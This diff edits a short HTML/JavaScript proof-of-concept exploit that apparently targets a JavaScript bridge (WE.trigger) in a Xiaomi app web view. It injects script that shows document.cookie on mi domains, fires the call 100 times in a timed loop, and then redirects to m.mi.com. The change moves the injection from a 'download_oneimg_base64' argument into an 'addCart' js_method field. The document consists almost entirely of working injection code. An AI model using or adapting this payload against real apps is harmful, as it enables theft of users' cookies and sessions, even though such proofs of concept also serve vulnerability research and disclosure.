@@ -1,17 +1,15 @@
-<script>
+ <script>
     function test(){
-        window.WE.trigger('download_oneimg_base64','','test\');if(document.domain.includes(\'mi\')){alert(document.cookie)};//');
-        
+       WE.trigger("addCart", '{"js_method":"if(document.domain.includes(\'mi\')){alert(document.cookie)}"}')
     }
-
+   
     function bypass(){
-        for(var i =0; i < 300; i++){
-            setTimeout(test, 5 + i);
-        }
+    for(var i =0; i < 100; i++)
+    
+    { setTimeout(test, 5 + i); }
     }
     bypass();
-    location.href = "https://www.mi.com/"; 
-    // alert(111);
-    // alert(WE.triggerString('getTrackerData',''));
-
+    location.href = "https://m.mi.com/"; 
+    
 </script>
+
